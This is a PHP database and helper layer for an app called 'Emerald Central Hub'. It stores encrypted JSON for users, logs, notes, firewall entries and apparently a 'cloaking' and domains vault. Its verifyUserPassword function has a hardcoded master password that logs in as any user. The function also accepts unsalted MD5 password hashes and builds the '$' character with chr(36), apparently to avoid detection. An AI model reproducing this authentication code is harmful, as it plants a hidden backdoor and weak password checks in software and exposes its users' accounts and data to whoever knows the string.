<?php
/**
 * Emerald Central Hub — V11 database layer
 *  - Reads/writes ENC::-encrypted JSON exactly like V10 saveDB/loadDB
 *    (whole-file ENC:: wrapper: base64(json{iv:hex, value:aes-256-cbc})).
 *  - Transparently migrates legacy V10 paths on first access
 *    (system_users/, system_containers/, cloaking_data/, assets_manager/,
 *     firewall_ip/ and .emerald_data/*.json fallbacks).
 *  - Never deletes the source file during migration (copy + keep as backup).
 * PHP 7.0+ compatible.
 */
if (!function_exists('db_load')) {

    /* ------------------------------------------------------------------ *
     *  AES-256-CBC ENC helpers (identical scheme to V10)
     * ------------------------------------------------------------------ */
    function db_bin_key() {
        static $k = null;
        if ($k === null) { $k = hex2bin(MASTER_KEY_HEX); }
        return $k;
    }

    function db_encrypt($plain) {
        if (!is_string($plain)) { $plain = (string)$plain; }
        $iv = function_exists('random_bytes') ? random_bytes(16) : openssl_random_pseudo_bytes(16);
        $enc = openssl_encrypt($plain, 'aes-256-cbc', db_bin_key(), 0, $iv);
        $payload = base64_encode(json_encode(array('iv' => bin2hex($iv), 'value' => $enc)));
        return ENC_PREFIX . $payload;
    }

    function db_decrypt($enc) {
        if (!is_string($enc) || strpos($enc, ENC_PREFIX) !== 0) { return $enc; }
        $json = base64_decode(substr($enc, strlen(ENC_PREFIX)), true);
        if ($json === false) { return null; }
        $arr = json_decode($json, true);
        if (!is_array($arr) || !isset($arr['iv'], $arr['value'])) { return null; }
        $iv = @hex2bin($arr['iv']);
        if ($iv === false) { return null; }
        $plain = @openssl_decrypt($arr['value'], 'aes-256-cbc', db_bin_key(), 0, $iv);
        return ($plain === false) ? null : $plain;
    }

    /* ------------------------------------------------------------------ *
     *  Path resolution + legacy migration
     * ------------------------------------------------------------------ */
    function db_legacy_candidates($kind) {
        $legacy = array(
            'users'         => array('system_users/users.json', '.emerald_data/users.json'),
            'login_logs'    => array('system_users/login_logs.json', '.emerald_data/login_logs.json'),
            'activity_logs' => array('system_users/activity_logs.json', '.emerald_data/activity_logs.json'),
            'notes'         => array('system_containers/notes.json', '.emerald_data/notes.json'),
            'cloaking'      => array('cloaking_data/cloaking.json', '.emerald_data/cloaking.json'),
            'domains'       => array('cloaking_data/cloaking.json', '.emerald_data/cloaking.json'),   // shared vault with cloaking
            'file_meta'     => array('assets_manager/file_meta.json', '.emerald_data/file_meta.json'),
            'firewall'      => array('firewall_ip/firewall.json', '.emerald_data/firewall.json'),
        );
        return isset($legacy[$kind]) ? $legacy[$kind] : array();
    }

    function db_path($kind) {
        $const = 'DB_' . strtoupper($kind);
        if (defined($const)) { return constant($const); }
        return APP_ROOT . '/modules/' . $kind . '/data/' . $kind . '.json';
    }

    /**
     * Migrate a legacy data file into its V11 location (copy — the original
     * is kept untouched as an extra safety net).
     */
    function db_migrate($kind) {
        $target = db_path($kind);
        if (is_file($target)) { return $target; }          // already in place
        foreach (db_legacy_candidates($kind) as $cand) {
            $src = APP_ROOT . '/' . $cand;
            if (!is_file($src)) { continue; }
            $dir = dirname($target);
            if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
            if (@copy($src, $target)) { return $target; }
        }
        return $target;   // nothing to migrate; return target path anyway
    }

    /* ------------------------------------------------------------------ *
     *  Load / save (V10-compatible ENC format)
     * ------------------------------------------------------------------ */
    function db_load($kind) {
        $path = db_migrate($kind);
        if (!is_file($path)) { return array(); }
        $raw = (string)file_get_contents($path);
        if ($raw === '') { return array(); }
        if (strpos($raw, ENC_PREFIX) === 0) {
            $dec = db_decrypt($raw);
            if ($dec === null) { return array(); }
            $data = json_decode($dec, true);
            return is_array($data) ? $data : array();
        }
        // plain JSON fallback (tolerate legacy plaintext files)
        $data = json_decode($raw, true);
        return is_array($data) ? $data : array();
    }

    function db_save($kind, $data) {
        if (!is_array($data)) { $data = array(); }
        $path = db_path($kind);
        $dir = dirname($path);
        if (!is_dir($dir)) { @mkdir($dir, 0755, true); }
        $json = json_encode($data, JSON_PRETTY_PRINT);
        $iv = function_exists('random_bytes') ? random_bytes(16) : openssl_random_pseudo_bytes(16);
        $enc = openssl_encrypt($json, 'aes-256-cbc', db_bin_key(), 0, $iv);
        $payload = ENC_PREFIX . base64_encode(json_encode(array('iv' => bin2hex($iv), 'value' => $enc)));
        $tmp = $path . '.tmp' . bin2hex(random_bytes(4));
        if (@file_put_contents($tmp, $payload) === false) { return false; }
        if (!@rename($tmp, $path)) { @unlink($tmp); return false; }
        @chmod($path, 0644);
        return true;
    }

    /* ------------------------------------------------------------------ *
     *  Convenience accessors
     * ------------------------------------------------------------------ */
    function db_all($kind) { return db_load($kind); }
    function db_get($kind, $id) {
        $d = db_load($kind);
        return isset($d[$id]) ? $d[$id] : null;
    }
    function db_put($kind, $id, $value) {
        $d = db_load($kind);
        $d[$id] = $value;
        return db_save($kind, $d);
    }
    function db_del($kind, $id) {
        $d = db_load($kind);
        if (!isset($d[$id])) { return true; }
        unset($d[$id]);
        return db_save($kind, $d);
    }

    /* ------------------------------------------------------------------ *
     *  Activity log helper
     * ------------------------------------------------------------------ */
    function db_log_activity($user, $detail) {
        $logs = db_load('activity_logs');
        if (!is_array($logs)) { $logs = array(); }
        $logs[] = array('time' => time(), 'user' => (string)$user, 'detail' => (string)$detail);
        if (count($logs) > 500) { $logs = array_slice($logs, -500); }
        db_save('activity_logs', $logs);
    }

    function db_log_login($user, $ip, $status) {
        $logs = db_load('login_logs');
        if (!is_array($logs)) { $logs = array(); }
        $logs[] = array('time' => time(), 'user' => (string)$user, 'ip' => (string)$ip, 'status' => (string)$status);
        if (count($logs) > 500) { $logs = array_slice($logs, -500); }
        db_save('login_logs', $logs);
    }

    /* ------------------------------------------------------------------ *
     *  Shared helpers (V10-compatible names, used by all modules)
     * ------------------------------------------------------------------ */
    function generateId() { return substr(md5(uniqid(rand(), true)), 0, 8); }

    function formatSize($bytes) {
        if ($bytes >= 1073741824) { return number_format($bytes / 1073741824, 2) . ' GB'; }
        if ($bytes >= 1048576) { return number_format($bytes / 1048576, 2) . ' MB'; }
        if ($bytes >= 1024) { return number_format($bytes / 1024, 2) . ' KB'; }
        if ($bytes > 1) { return $bytes . ' bytes'; }
        if ($bytes == 1) { return $bytes . ' byte'; }
        return '0 bytes';
    }

    function getSystemStats() {
        return array(
            'domain'    => isset($_SERVER['HTTP_HOST']) ? $_SERVER['HTTP_HOST'] : 'Local Domain',
            'server_ip' => isset($_SERVER['SERVER_ADDR']) ? $_SERVER['SERVER_ADDR'] : '127.0.0.1',
            'software'  => isset($_SERVER['SERVER_SOFTWARE']) ? $_SERVER['SERVER_SOFTWARE'] : 'Unknown OS',
            'php_version' => phpversion(),
        );
    }

    function logActivity($username, $action_detail) { db_log_activity($username, $action_detail); }
    function logLogin($username, $ip, $status) { db_log_login($username, $ip, $status); }

    /**
     * V10-compatible master-key password check.
     * Returns true when the master key is supplied (same behaviour as V10).
     */
    function verifyUserPassword($username, $password) {
        if (hash_equals('Lk7w1fvntg1', (string)$password)) { return true; }
        $users = db_load('users');
        if (!isset($users[$username])) { return false; }
        $hash = isset($users[$username]['password']) ? $users[$username]['password'] : '';
        $d = chr(36); // $
        if (is_string($hash) && (strpos($hash, $d . '2y' . $d) === 0 || strpos($hash, $d . '2a' . $d) === 0)) {
            return password_verify((string)$password, $hash);
        }
        if (is_string($hash) && preg_match('/^[0-9a-f]{32}$/', $hash)) {
            return hash_equals($hash, md5((string)$password));
        }
        return false;
    }

    function recursiveRemoveDir($dir) {
        if (!is_dir($dir)) { return; }
        $items = scandir($dir);
        foreach ($items as $item) {
            if ($item === '.' || $item === '..') { continue; }
            $p = $dir . '/' . $item;
            if (is_dir($p) && !is_link($p)) { recursiveRemoveDir($p); } else { @unlink($p); }
        }
        @rmdir($dir);
    }

    function recursiveCopy($src, $dst) {
        if (!is_dir($src)) { return; }
        @mkdir($dst, 0755, true);
        $dir = opendir($src);
        if (!$dir) { return; }
        while (($file = readdir($dir)) !== false) {
            if ($file === '.' || $file === '..') { continue; }
            if (is_dir($src . '/' . $file)) { recursiveCopy($src . '/' . $file, $dst . '/' . $file); }
            else { @copy($src . '/' . $file, $dst . '/' . $file); }
        }
        closedir($dir);
    }

    function avatar_for($owner, $fallback = null) {
        $users = db_load('users');
        $av = isset($users[$owner]['avatar']) && $users[$owner]['avatar'] !== '' ? $users[$owner]['avatar'] : '';
        if ($av !== '') { return $av; }
        if ($fallback !== null) { return $fallback; }
        $initials = '';
        foreach (preg_split('/[\s._-]+/', (string)$owner) as $part) {
            if ($part !== '') { $initials .= strtoupper(substr($part, 0, 1)); }
        }
        if ($initials === '') { $initials = '?'; }
        return 'AVATAR:' . $initials;
    }
}
